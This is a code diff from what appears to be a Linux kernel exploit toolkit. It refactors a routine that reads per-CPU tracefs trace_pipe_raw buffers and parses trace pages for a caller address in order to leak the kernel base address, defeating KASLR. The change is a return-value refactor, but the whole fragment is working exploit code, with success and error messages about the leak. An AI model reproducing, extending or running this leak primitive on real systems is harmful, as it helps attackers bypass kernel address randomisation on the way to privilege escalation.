@@ -14,8 +14,8 @@ static int slide_tracefs_write(const char *path, const char *value) {
   return wrote == (ssize_t)len;
 }
 
-static uintptr_t slide_tracefs_parse_page(
-    const unsigned char *page, size_t page_len) {
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
   if (page_len < 20) {
     return 0;
   }
@@ -62,7 +62,8 @@ static uintptr_t slide_tracefs_parse_page(
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
-          return (uintptr_t)candidate;
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
         }
       }
     }
@@ -95,7 +96,8 @@ static int slide_tracefs_leak_kernel_base(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   uintptr_t candidate = 0;
-  for (int cpu = 0; cpu < cpu_count && !candidate; cpu++) {
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
              SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
@@ -106,15 +108,15 @@ static int slide_tracefs_leak_kernel_base(void) {
     unsigned char page[4096];
     ssize_t got;
     while ((got = read(fd, page, sizeof(page))) > 0) {
-      candidate = slide_tracefs_parse_page(page, (size_t)got);
-      if (candidate) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
         break;
       }
     }
     close(fd);
   }
   slide_tracefs_write(event_enable, "0");
-  if (!candidate) {
+  if (!found) {
     pr_error("slide tracefs worker caller not found\n");
     return 0;
   }
